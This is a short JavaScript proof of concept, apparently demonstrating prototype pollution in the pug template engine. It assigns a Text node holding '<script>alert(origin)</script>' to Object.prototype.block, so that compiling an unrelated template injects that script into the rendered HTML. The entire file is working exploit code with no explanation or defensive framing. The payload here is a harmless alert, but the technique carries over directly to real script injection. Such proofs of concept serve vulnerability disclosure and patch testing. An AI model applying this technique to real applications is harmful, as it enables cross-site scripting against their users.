const pug = require('pug');
Object.prototype.block = {"type":"Text", "val":`<script>alert(origin)</script>`};
const source = `h1= msg`;
var fn = pug.compile(source);
var html = fn({msg: 'It works'});
console.log(html);